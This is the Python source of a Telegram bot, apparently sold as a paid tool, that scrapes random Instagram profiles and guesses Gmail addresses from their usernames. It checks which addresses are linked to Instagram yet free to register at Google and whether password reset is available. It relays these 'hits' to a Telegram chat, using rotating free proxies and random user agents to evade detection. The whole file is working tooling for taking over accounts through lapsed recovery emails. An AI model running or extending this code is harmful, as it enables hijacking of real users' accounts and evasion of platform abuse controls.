import os
import sys
import time
import threading
import random
import json
import requests
import re
import string
import secrets
import logging
from datetime import datetime
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.error import Conflict, NetworkError
import user_agent
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import concurrent.futures

# ========================
# LOGGING SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========================
# CONFIGURATION FROM ENVIRONMENT
# ========================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID", "YOUR_CHAT_ID")
PORT = int(os.getenv("PORT", 8443))

# ========================
# GLOBAL VARIABLES
# ========================
is_running = False
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
TOKEN_FILE = 'InstaTool_Token.txt'
instatool_domain = '@gmail.com'
lock = threading.Lock()
updater = None

# ========================
# PROXY ROTATION SYSTEM
# ========================
class ProxyRotator:
    def __init__(self):
        self.working_proxies = Queue()
        self.dead_proxies = set()
        self.proxy_sources = [
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt'
        ]
        self.last_refresh = 0
        self.refresh_interval = 300  # 5 minutes
        logger.info("🔄 Proxy Rotator Initialized")
        
    def fetch_proxies_from_url(self, url):
        """Fetch proxies from a single URL"""
        try:
            headers = {'User-Agent': user_agent.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=15)
            
            if response.status_code == 200:
                proxies = []
                lines = response.text.strip().split('\n')
                
                for line in lines:
                    line = line.strip()
                    if ':' in line and len(line.split(':')) == 2:
                        ip, port = line.split(':')
                        if self.is_valid_ip_port(ip, port):
                            proxies.append(f"{ip}:{port}")
                
                logger.info(f"✅ Fetched {len(proxies)} proxies from {url[:30]}...")
                return proxies
            else:
                logger.warning(f"⚠️ Failed to fetch from {url}: {response.status_code}")
                return []
                
        except Exception as e:
            logger.error(f"❌ Error fetching from {url}: {e}")
            return []
    
    def is_valid_ip_port(self, ip, port):
        """Basic validation for IP:PORT format"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not (0 <= int(part) <= 255):
                    return False
            if not (1 <= int(port) <= 65535):
                return False
            return True
        except:
            return False
    
    def test_proxy(self, proxy):
        """Test if a proxy is working"""
        try:
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            
            headers = {'User-Agent': user_agent.generate_user_agent()}
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                headers=headers,
                timeout=8
            )
            
            if response.status_code == 200 and 'origin' in response.text:
                return True
                
        except:
            pass
        
        return False
    
    def refresh_proxy_list(self):
        """Refresh proxy list from multiple sources"""
        if time.time() - self.last_refresh < self.refresh_interval:
            return
            
        logger.info("🔄 Refreshing proxy list...")
        all_proxies = []
        
        # Fetch from all sources concurrently
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_url = {
                executor.submit(self.fetch_proxies_from_url, url): url 
                for url in self.proxy_sources
            }
            
            for future in as_completed(future_to_url):
                proxies = future.result()
                all_proxies.extend(proxies)
        
        # Remove duplicates
        unique_proxies = list(set(all_proxies))
        random.shuffle(unique_proxies)
        
        logger.info(f"📝 Testing {len(unique_proxies)} unique proxies...")
        
        # Test proxies concurrently (limited batch)
        working_count = 0
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_proxy = {
                executor.submit(self.test_proxy, proxy): proxy 
                for proxy in unique_proxies[:100]  # Test first 100
            }
            
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                if future.result():
                    self.working_proxies.put(proxy)
                    working_count += 1
                    if working_count >= 50:  # Keep 50 working proxies
                        break
        
        logger.info(f"✅ Added {working_count} working proxies to pool")
        self.last_refresh = time.time()
    
    def get_random_proxy(self):
        """Get a random working proxy"""
        # Refresh if needed
        self.refresh_proxy_list()
        
        if self.working_proxies.empty():
            logger.warning("⚠️ No working proxies available, using direct connection")
            return None
        
        proxy = self.working_proxies.get()
        
        # Put it back (with some chance to remove dead ones)
        if random.random() > 0.1:  # 90% chance to put back
            self.working_proxies.put(proxy)
        
        return {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

# ========================
# GLOBAL PROXY ROTATOR INSTANCE
# ========================
proxy_rotator = ProxyRotator()

logger.info("="*60)
logger.info("🚀 ROHAN PAID BOT - HIGH SPEED WITH PROXY ROTATION")
logger.info("="*60)
logger.info("🚀 BOT INITIALIZED")
logger.info(f"BOT_TOKEN: {BOT_TOKEN[:10]}...")
logger.info(f"CHAT_ID: {CHAT_ID}")

# ========================
# CLEAR TELEGRAM CONFLICTS
# ========================
def clear_telegram_conflicts():
    """Clear any existing webhooks or conflicts"""
    try:
        logger.info("🧹 Clearing Telegram conflicts...")
        delete_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true"
        response = requests.get(delete_url, timeout=10)
        
        if response.status_code == 200:
            result = response.json()
            if result.get('ok'):
                logger.info("✅ Webhook deleted and pending updates dropped")
        
        time.sleep(2)
        return True
    except Exception as e:
        logger.error(f"❌ Error clearing conflicts: {e}")
        return False

# ========================
# TELEGRAM BOT SETUP WITH RETRY
# ========================
def setup_updater_with_retry(max_retries=5):
    """Setup updater with automatic retry on conflicts"""
    global updater
    
    for attempt in range(max_retries):
        try:
            logger.info(f"🔄 Setting up Telegram updater (attempt {attempt + 1}/{max_retries})")
            clear_telegram_conflicts()
            
            updater = Updater(token=BOT_TOKEN, use_context=True)
            dispatcher = updater.dispatcher
            
            dispatcher.add_handler(CommandHandler("start", start_command))
            dispatcher.add_handler(CommandHandler("stop", stop_command))
            dispatcher.add_handler(CommandHandler("status", status_command))
            dispatcher.add_handler(CommandHandler("help", help_command))
            dispatcher.add_handler(CommandHandler("logs", logs_command))
            dispatcher.add_handler(CommandHandler("proxies", proxy_status_command))
            
            logger.info("✅ Telegram Bot Setup Complete")
            return updater
            
        except Conflict as e:
            logger.warning(f"⚠️ Conflict on attempt {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                wait_time = (attempt + 1) * 10
                logger.info(f"⏰ Waiting {wait_time} seconds before retry...")
                time.sleep(wait_time)
                
        except Exception as e:
            logger.error(f"❌ Telegram Setup Error (attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                time.sleep(5)
    
    return None

# ========================
# COMMAND HANDLERS
# ========================
def start_command(update: Update, context: CallbackContext):
    global is_running
    if is_running:
        update.message.reply_text("⚠️ Bot is already running!")
        return
    
    is_running = True
    update.message.reply_text("""
✅ **BOT STARTED - HIGH SPEED MODE**

🚀 Bot running 24/7 with Proxy Rotation
🔄 IP changes every request (Anti-Detection)
📊 Hits will be sent automatically
🛑 Use /stop to stop the bot
📈 Use /status to check stats
🌐 Use /proxies to check proxy status

🎯 **Starting high-speed threads...**
    """, parse_mode='Markdown')
    
    logger.info(f"✅ Bot started by {update.effective_user.id}")
    start_bot_threads()

def stop_command(update: Update, context: CallbackContext):
    global is_running
    is_running = False
    update.message.reply_text("🛑 **Bot Stopped**\n\nUse /start to restart", parse_mode='Markdown')
    logger.info(f"🛑 Bot stopped by {update.effective_user.id}")

def status_command(update: Update, context: CallbackContext):
    proxy_count = proxy_rotator.working_proxies.qsize()
    status_text = f"""
📊 **HIGH-SPEED BOT STATUS**

✅ Running: {is_running}
📈 Total Hits: {total_hits}
🎯 Good Instagram: {good_ig}
❌ Bad Instagram: {bad_insta}
📧 Bad Gmails: {bad_email}
🔄 Current Hits: {hits}
🌐 Active Proxies: {proxy_count}

⏰ Uptime: Railway.app with Proxy Rotation
🚀 By: @ROHAN_DEAL_BOT
    """
    update.message.reply_text(status_text, parse_mode='Markdown')

def proxy_status_command(update: Update, context: CallbackContext):
    proxy_count = proxy_rotator.working_proxies.qsize()
    last_refresh = proxy_rotator.last_refresh
    refresh_time = datetime.fromtimestamp(last_refresh).strftime('%H:%M:%S') if last_refresh > 0 else "Never"
    
    proxy_text = f"""
🌐 **PROXY SYSTEM STATUS**

🔄 Active Proxies: {proxy_count}
⏰ Last Refresh: {refresh_time}
📡 Sources: 5 Different APIs
🔄 Auto-Refresh: Every 5 minutes
⚡ Speed: Concurrent Testing
🎯 Rotation: Every Request

**Proxy Sources:**
• proxy-list.download
• proxyscrape.com  
• GitHub: TheSpeedX
• GitHub: monosans
• GitHub: clarketm

🚀 Status: {"✅ Active" if proxy_count > 0 else "❌ Refreshing"}
    """
    update.message.reply_text(proxy_text, parse_mode='Markdown')

def help_command(update: Update, context: CallbackContext):
    help_text = """
🤖 **ROHAN HIGH-SPEED BOT COMMANDS**

/start - Start bot (high-speed mode)
/stop - Stop the bot
/status - Show bot & hit stats
/proxies - Show proxy system status
/logs - Show last 10 log lines
/help - Show this message

🎯 **High-Speed Features:**
✅ Runs 24/7 on Railway.app
✅ Auto proxy rotation (IP changes every request)
✅ 5 proxy sources (100+ IPs)
✅ Concurrent processing (10+ threads)
✅ Auto-restart on crashes
✅ Real-time hit notifications
✅ Smart error handling
✅ Fast Instagram/Gmail checking

🌐 **Proxy System:**
• Fetches from 5 different sources
• Tests 100+ proxies concurrently
• Keeps 50+ working proxies active
• Auto-refreshes every 5 minutes
• Random rotation (no patterns)

BY ~ @ROHAN_DEAL_BOT
    """
    update.message.reply_text(help_text, parse_mode='Markdown')

def logs_command(update: Update, context: CallbackContext):
    try:
        with open('bot.log', 'r') as f:
            lines = f.readlines()
        last_lines = ''.join(lines[-10:])
        update.message.reply_text(f"```\n{last_lines}\n```", parse_mode='Markdown')
    except:
        update.message.reply_text("❌ No logs available yet")

# ========================
# HIGH-SPEED REQUESTS WITH PROXY ROTATION
# ========================
def make_request_with_proxy(url, headers=None, data=None, method='GET', timeout=10):
    """Make HTTP request with automatic proxy rotation"""
    max_attempts = 3
    
    for attempt in range(max_attempts):
        try:
            # Get random proxy
            proxies = proxy_rotator.get_random_proxy()
            
            # Random user agent
            if not headers:
                headers = {}
            headers['User-Agent'] = user_agent.generate_user_agent()
            
            # Make request
            if method.upper() == 'POST':
                response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=timeout)
            else:
                response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
            
            return response
            
        except Exception as e:
            logger.debug(f"Request attempt {attempt + 1} failed: {e}")
            if attempt == max_attempts - 1:
                # Final attempt without proxy
                try:
                    if method.upper() == 'POST':
                        return requests.post(url, headers=headers, data=data, timeout=timeout)
                    else:
                        return requests.get(url, headers=headers, timeout=timeout)
                except Exception as final_e:
                    logger.error(f"All request attempts failed: {final_e}")
                    return None
    
    return None

# ========================
# INSTAGRAM EMAIL CHECKER (WITH PROXY)
# ========================
def check_instagram_email(mail):
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': secrets.token_hex(16),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        data = {'email': mail}
        response = make_request_with_proxy(url, headers=headers, data=data, method='POST')
        
        if response:
            return "email_is_taken" in response.text
        
        return False
    except Exception as e:
        logger.error(f"IG Email Check Error: {e}")
        return False

# ========================
# RESET INFO FETCHER (WITH PROXY)
# ========================
def get_reset_info(fr):
    try:
        url = "https://www.instagram.com/async/wbloks/fetch/"
        
        headers = {
            'Accept-Encoding': "gzip, deflate, br",
            'origin': "https://www.instagram.com",
            'referer': "https://www.instagram.com/accounts/password/reset/",
        }
        
        params = {
            'appid': "com.bloks.www.caa.ar.search.async",
            'type': "action",
        }
        
        payload = {
            '__d': "www",
            'params': '{"search_query":"' + fr + '"}'
        }
        
        response = make_request_with_proxy(url + '?' + '&'.join([f"{k}={v}" for k, v in params.items()]), 
                                         headers=headers, data=payload, method='POST')
        
        if response and response.status_code == 200:
            return "✅ Reset Available"
        else:
            return "❌ Not Available"
    except Exception as e:
        return "⚠️ Error"

# ========================
# GOOGLE ACCOUNT TOKEN GENERATOR
# ========================
def generate_google_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(alphabet) for _ in range(random.randint(6, 9)))
        n2 = ''.join(random.choice(alphabet) for _ in range(random.randint(3, 9)))
        host = ''.join(random.choice(alphabet) for _ in range(random.randint(15, 30)))
        
        headers = {
            'accept': '*/*',
        }
        
        recovery_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        
        response = make_request_with_proxy(recovery_url, headers=headers)
        
        if response:
            tok_match = re.search(r'&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', response.text)
            if tok_match:
                token = tok_match.group(2)
            else:
                token = secrets.token_hex(32)
        else:
            token = secrets.token_hex(32)
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token}//{host}\n")
        
        logger.info("✅ Google Token Generated")
        return True
    except Exception as e:
        logger.error(f"Token Generation Error: {e}")
        return False

# ========================
# GOOGLE EMAIL CHECKER (WITH PROXY)
# ========================
def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        
        if not os.path.exists(TOKEN_FILE):
            generate_google_token()
        
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip().split('\n')[0]
        
        if '//' not in token_data:
            return
        
        tl, host = token_data.split('//')
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'__Host-GAPS={host}',
        }
        
        params = {'TL': tl}
        data = f"continue=https%3A%2F%2Fmail.google.com&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%5D&flowName=GlifWebSignIn"
        
        url = 'https://accounts.google.com/_/signup/usernameavailability'
        full_url = url + '?' + '&'.join([f"{k}={v}" for k, v in params.items()])
        
        response = make_request_with_proxy(full_url, headers=headers, data=data, method='POST')
        
        if response and '"gf.uar",1' in response.text:
            with lock:
                hits += 1
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            fetch_account_info(username, domain)
        else:
            with lock:
                bad_email += 1
    except Exception as e:
        logger.error(f"Gmail Check Error: {e}")

# ========================
# MAIN CHECK FUNCTION
# ========================
def check(email):
    global good_ig, bad_insta
    try:
        email_exists = check_instagram_email(email)
        
        if email_exists:
            if instatool_domain in email:
                check_gmail(email)
            with lock:
                good_ig += 1
        else:
            with lock:
                bad_insta += 1
                
        # Small random delay to avoid hammering
        time.sleep(random.uniform(0.5, 2.0))
        
    except Exception as e:
        logger.error(f"Check Error: {e}")
        with lock:
            bad_insta += 1

# ========================
# FETCH ACCOUNT INFO & SEND TO TELEGRAM
# ========================
def fetch_account_info(username, domain):
    global total_hits
    try:
        with lock:
            total_hits += 1
        
        account_info = infoinsta.get(username, {})
        followers = account_info.get('follower_count', 'N/A')
        following = account_info.get('following_count', 'N/A')
        posts = account_info.get('media_count', 'N/A')
        bio = account_info.get('biography', 'N/A')
        full_name = account_info.get('full_name', 'N/A')
        
        reset_status = get_reset_info(username)
        
        info_text = f"""
🚀 **ROHAN HIGH-SPEED BOT HIT**

🎯 Hit #: `{total_hits}`
👤 Username: `@{username}`
📧 Email: `{username}@{domain}`
👥 Followers: `{followers}`
➡️ Following: `{following}`
📸 Posts: `{posts}`
📝 Bio: `{bio}`
🔁 Reset: `{reset_status}`

⏰ Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
🌐 Via: Proxy Rotation

BY ~ @ROHAN_DEAL_BOT
        """
        
        log_to_file(info_text)
        send_to_telegram(info_text)
        logger.info(f"✅ HIGH-SPEED HIT #{total_hits}: {username}@{domain}")
        
    except Exception as e:
        logger.error(f"Fetch Account Info Error: {e}")

# ========================
# LOG & TELEGRAM SENDER
# ========================
def log_to_file(text):
    try:
        with open('instahits.txt', 'a') as f:
            f.write(text + "\n" + "="*50 + "\n")
    except Exception as e:
        logger.error(f"Log Error: {e}")

def send_to_telegram(text):
    try:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}&parse_mode=Markdown",
            timeout=10
        )
    except Exception as e:
        logger.error(f"Telegram Send Error: {e}")

# ========================
# HIGH-SPEED INSTAGRAM SCRAPER (CONCURRENT)
# ========================
def instagram_scraper():
    logger.info("🔄 High-Speed Instagram Scraper Started")
    
    while is_running:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(3713668786, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {
                'X-FB-LSD': data['lsd'],
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            response = make_request_with_proxy(
                'https://www.instagram.com/api/graphql',
                headers=headers,
                data=data,
                method='POST'
            )
            
            if response:
                try:
                    json_data = response.json()
                    account = json_data.get('data', {}).get('user', {})
                    username = account.get('username')
                    
                    if username:
                        infoinsta[username] = account
                        emails = [username + instatool_domain]
                        
                        for email in emails:
                            check(email)
                except json.JSONDecodeError:
                    logger.debug("JSON decode error in Instagram response")
            
            # Reduced delay for higher speed
            time.sleep(random.uniform(1, 3))
            
        except Exception as e:
            logger.error(f"Instagram Scraper Error: {e}")
            time.sleep(5)

# ========================
# START HIGH-SPEED BOT THREADS
# ========================
def start_bot_threads():
    logger.info("📌 Starting High-Speed Bot Threads...")
    
    # Start 10 concurrent scraper threads for maximum speed
    for i in range(10):
        thread = threading.Thread(target=instagram_scraper, daemon=True, name=f"HighSpeed-Scraper-{i+1}")
        thread.start()
        logger.info(f"✅ High-Speed Thread {i+1} started")
    
    # Initialize proxy system in background
    proxy_thread = threading.Thread(target=proxy_rotator.refresh_proxy_list, daemon=True, name="Proxy-Manager")
    proxy_thread.start()
    logger.info("✅ Proxy Manager Thread started")
    
    time.sleep(1)

# ========================
# MAIN EXECUTION WITH RETRY LOGIC
# ========================
def main():
    logger.info("🔑 Generating Google Token...")
    generate_google_token()
    
    logger.info("🌐 Initializing Proxy System...")
    proxy_rotator.refresh_proxy_list()
    
    # Setup updater with conflict handling
    updater = setup_updater_with_retry()
    
    if not updater:
        logger.error("❌ Failed to setup Telegram bot after all retries. Exiting...")
        sys.exit(1)
    
    # Start polling with error handling
    try:
        logger.info("🚀 Starting High-Speed Telegram Polling...")
        updater.start_polling(
            poll_interval=2,
            timeout=20,
            clean=True,
            allowed_updates=['message']
        )
        updater.idle()
        
    except KeyboardInterrupt:
        logger.info("⚠️ Bot interrupted by user")
        updater.stop()
        
    except NetworkError as e:
        logger.error(f"❌ Network Error: {e}")
        time.sleep(30)
        main()
        
    except Conflict as e:
        logger.error(f"❌ Conflict Error: {e}")
        time.sleep(60)
        main()
        
    except Exception as e:
        logger.error(f"❌ Main Error: {e}")
        time.sleep(30)
        main()

if __name__ == '__main__':
    main()
